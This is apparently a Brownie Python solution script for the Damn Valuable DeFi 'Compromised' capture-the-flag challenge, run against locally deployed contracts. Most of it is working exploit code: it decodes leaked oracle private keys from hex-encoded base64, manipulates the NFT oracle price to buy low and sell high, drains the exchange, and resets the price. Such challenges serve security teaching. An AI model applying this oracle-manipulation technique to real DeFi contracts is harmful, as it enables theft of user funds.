from brownie import *
import base64

def main():
    deployer = a[0]
    attacker = a[1]

    # get 10000 ether for deployer
    for acc in a[1:]:
        acc.transfer(deployer, acc.balance())

    sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ]

    EXCHANGE_INITIAL_ETH_BALANCE = Wei('9990 ether')
    INITIAL_NFT_PRICE = Wei('999 ether')

    for s in sources:
        deployer.transfer(s, '2 ether')

    deployer.transfer(attacker, '0.1 ether')
    assert attacker.balance() == Wei('0.1 ether')

    oracleInitializer = TrustfulOracleInitializer.deploy(
        sources,
        ['DVNFT']*3,
        [INITIAL_NFT_PRICE]*3,
        {'from': deployer}
    )
    oracle = TrustfulOracle.at(oracleInitializer.oracle())

    exchange = Exchange.deploy(oracle,
        {'from': deployer, 'value': EXCHANGE_INITIAL_ETH_BALANCE})

    nftToken = DamnValuableNFT.at(exchange.token())

    # Exploit code here
    key1_b64 = '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35'
    key2_b64 = '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'
    to_key = lambda x: base64.b64decode(bytes.fromhex(x)).decode()
    pk1 = to_key(key1_b64)
    pk2 = to_key(key2_b64)
    s1 = accounts.add(pk1)
    s2 = accounts.add(pk2)
    # make sure private keys decoded correctly from base64
    assert s1 in sources
    assert s2 in sources
    for s in {s1, s2}:
        oracle.postPrice('DVNFT', 0, {'from': s})
    exchange.buyOne({'from': attacker, 'value': attacker.balance()})
    for s in {s1, s2}:
        oracle.postPrice('DVNFT', exchange.balance(), {'from': s})
    nftToken.approve(exchange, 0, {'from': attacker})
    exchange.sellOne(0, {'from': attacker})
    # reset the price
    for s in {s1, s2}:
        oracle.postPrice('DVNFT', INITIAL_NFT_PRICE, {'from': s})


    # Success conditions
    assert exchange.balance() == 0
    assert attacker.balance() > EXCHANGE_INITIAL_ETH_BALANCE
    assert nftToken.balanceOf(attacker) == 0
    assert oracle.getMedianPrice('DVNFT') == INITIAL_NFT_PRICE

    print('Challenge successfully passed.')

